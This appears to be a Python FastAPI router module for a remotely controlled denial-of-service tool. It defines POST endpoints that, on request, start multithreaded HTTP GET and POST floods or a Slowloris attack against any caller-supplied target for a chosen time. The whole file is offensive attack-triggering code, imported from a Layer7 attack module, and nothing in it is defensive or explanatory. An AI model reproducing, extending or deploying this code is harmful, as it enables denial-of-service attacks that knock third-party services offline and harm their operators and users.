from fastapi import APIRouter, Request
from denialofservice import Layer7
from globals import NUMBER_OF_THREADS
from threading import Thread
from log import log

router = APIRouter()

@router.post("/httpGETflood")
async def read_parameters(time: int, target: str, request: Request):
    try:
        for i in range(NUMBER_OF_THREADS):
            t = Thread(target=Layer7.HTTP_GET_Flood, args=(target, time,))
            t.start()
        log.info(f"{target} HTTP-GET-FLooded from {request.client.host} for {time} seconds")
    except:
        log.warning(f"{target} HTTP-GET-FLood from {request.client.host} for {time} seconds could not be triggered")

@router.post("/httpPOSTflood")
async def read_parameters(time: int, target: str, payload: str, request: Request):
    try:
        for i in range(NUMBER_OF_THREADS):
            t = Thread(target=Layer7.HTTP_POST_Flood, args=(target, time, payload,))
            t.start()
        log.info(f"{target} HTTP-POST-FLooded from {request.client.host} for {time} seconds")
    except:
        log.warning(f"{target} HTTP-POST-FLood from {request.client.host} for {time} seconds could not be triggered")

@router.post("/slowloris")
async def read_parameters(target: str, port: int, time: int, request: Request):
    try:
        Layer7.SLOW_Loris(target, port, time)
        log.info(f"{target} SLOW-Loris from {request.client.host} for {time} seconds")
    except:
        log.warning(f"{target} SlOW-Loris from {request.client.host} for {time} seconds could not be triggered")
